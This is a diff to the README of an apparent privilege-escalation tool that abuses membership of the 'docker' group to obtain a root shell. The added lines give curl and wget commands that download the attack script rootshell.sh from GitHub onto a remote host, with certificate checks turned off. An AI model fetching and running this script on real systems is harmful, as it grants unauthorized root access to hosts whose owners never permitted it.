@@ -6,6 +6,12 @@ This interactive script allows you to abuse the `docker` group to get root shell
 
 Copy the contents of [`rootshell.sh`](rootshell.sh) to the clipboard and paste into `rootshell.sh` on the remote Docker host system.
 
+Or if you have Internet access on the remote host, run one of the following commands:
+
+- `curl -skLO https://raw.githubusercontent.com/phx/dockergroupabuse/master/rootshell.sh`
+
+- `wget --no-check-certificate https://raw.githubusercontent.com/phx/dockergroupabuse/master/rootshell.sh`
+
 ### Remote Docker Host:
 
 ```
